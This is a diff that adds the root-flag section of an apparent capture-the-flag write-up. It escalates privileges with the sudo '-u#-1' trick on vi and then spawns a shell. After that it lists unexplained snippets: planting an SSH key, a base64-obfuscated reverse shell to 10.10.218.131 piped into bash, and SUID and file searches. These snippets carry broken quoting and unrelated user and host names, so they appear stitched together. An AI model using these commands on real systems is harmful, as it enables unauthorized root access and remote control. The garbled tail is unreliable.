@@ -258,3 +258,46 @@ And we can see the user flag.
 
 ### Root Flag
 
+We are `gabriel` user. We can use `sudo -l` to see if we can run any command as root.
+
+```bash
+sudo -l
+env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+User gabriel may run the following commands on muso-troglodytarum:
+    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gabriel/user.txt
+```
+
+We can see that we can run `vi` as root, we have found an exploit for `vi` to get a root shell. (https://www.exploit-db.com/exploits/47502)
+
+We can use the following command to get a root shell.
+
+```bash
+sudo -u#-1  /usr/bin/vi /home/gabriel/user.txt 
+```
+
+We have exit the `vi` editor and we have a root shell.
+```bash
+:!sh
+```
+
+If we use `whoami` we can see that we are `root`.
+
+```bash
+echo 'echo " > /tmp/add_key.sh
+```
+
+```bash
+echo 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDlNvyXd9NFij3V1VyODgoSjvtM3n/AAxBfTG1Q7YU7WkiBSCalHBkZMzOE2OODhROzVwfKjGMwSoU2wZsqjNUgJPFTdWmPF3vouGL5RDEJggja1PO+bqSRRUNzEPOZCHC5LZosQkX/eqpKD22gwJgo725ZpeQA/voz/bq6ZfJo7bk1QxulvYtu4J61Ga+KV01D4z2K2w9ts8IG+dOsgvXjx6LiID4b9IE273ELFXsAcK1OD7t3kRLFTlOfLSkdSEHmObpjmh6LBwj6pL7as3e+unGylLiZ3Tan0DhvLRzkrAexuW0db+7Opd4zaPRF/8juBHUdyMm6mipOWAm9hJc9 www-data@the-maw’ >> /tmp/add_key.sh
+```
+
+```bash
+echo "c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMjE4LjEzMS85MDA0IDA+JjE=" | base64 --decode | /bin/bash
+```
+
+```bash
+find / -user mono -perm -4000 -exec ls -l {} \; 
+```
+
+```bash
+find /var/www/html -name « *.txt » 2>/dev/null
+```
